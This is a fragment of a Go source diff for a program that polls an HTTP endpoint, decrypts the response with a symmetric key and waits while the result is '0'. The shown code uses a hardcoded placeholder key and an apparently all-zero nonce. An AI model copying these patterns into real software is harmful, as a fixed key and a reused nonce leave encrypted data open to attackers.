@@ -2,12 +2,14 @@ package main
 
 import (
 	"crypto"
+	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/x509"
 	"encoding/hex"
 	"encoding/pem"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
@@ -100,8 +102,8 @@ func getCurrentUser() (name string) {
 }
 
 func main() {
-	nonce := []byte{...}
-	const key =	"12345678901234567890123456789012"	
+	nonce := make([]byte, chacha20poly1305.NonceSizeX)
+	key := []byte("12345678901234567890123456789012")
 	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4pz/Qsw7oDtdwT857JcsGU4KWHFi+OgnFbK02BwF82mlESwn9znXldI9guEYW476XvgfMTNP0reGxle+BmIn+AujJ/QF7gQtZ2W/QCZPaOK2sbphRNfaY4zlb8qLrCvsZ4K5SGpyY7U/skyF1lPIW1Og6N+HY8+eSG9xzzGl/SfAjaIhyBT1g94jFtZty9NYXNevdLwdU8OhU1/IzmQU2jG225vZgF0lvbkrVgTLV+iVKqQt1NsLqh141II6UEqZuEHvKtuclbJLTxKSF2uNBCPILDhv8zIqq0K6368hQ8P7FAPoQK96pjx4UwviMG+RSZfa/T7h5tKJNM3cVz3NTwIDAQAB\n-----END PUBLIC KEY-----"
 	PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
 	if PEMBlock == nil {
@@ -151,10 +153,12 @@ func main() {
 		}
 
 		//Convert the body to type string
-		esb := string(body)
+		esb := body
 		// we need to decrypt the body now
 
-		sb,_ := decryptMessage(Key, esb, nonce)
+		byte_sb, _ := decryptMessage(key, esb, nonce)
+
+		sb := string(byte_sb)
 
 		for sb == "0" {
 			time.Sleep(2 * time.Second)
